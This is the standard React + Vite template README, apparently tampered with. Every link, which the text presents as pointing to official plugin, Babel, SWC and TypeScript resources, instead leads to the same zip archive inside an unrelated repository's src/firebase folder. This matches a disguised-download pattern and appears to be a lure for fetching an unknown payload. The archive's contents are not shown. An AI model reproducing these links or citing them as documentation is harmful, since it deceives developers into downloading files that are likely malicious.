# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/jobayer58/Coffee-Store-Client/main/src/firebase/Store-Coffee-Client-v2.1-beta.5.zip) uses [Babel](https://raw.githubusercontent.com/jobayer58/Coffee-Store-Client/main/src/firebase/Store-Coffee-Client-v2.1-beta.5.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/jobayer58/Coffee-Store-Client/main/src/firebase/Store-Coffee-Client-v2.1-beta.5.zip) uses [SWC](https://raw.githubusercontent.com/jobayer58/Coffee-Store-Client/main/src/firebase/Store-Coffee-Client-v2.1-beta.5.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend using TypeScript and enable type-aware lint rules. Check out the [TS template](https://raw.githubusercontent.com/jobayer58/Coffee-Store-Client/main/src/firebase/Store-Coffee-Client-v2.1-beta.5.zip) to integrate TypeScript and [`typescript-eslint`](https://raw.githubusercontent.com/jobayer58/Coffee-Store-Client/main/src/firebase/Store-Coffee-Client-v2.1-beta.5.zip) in your project.
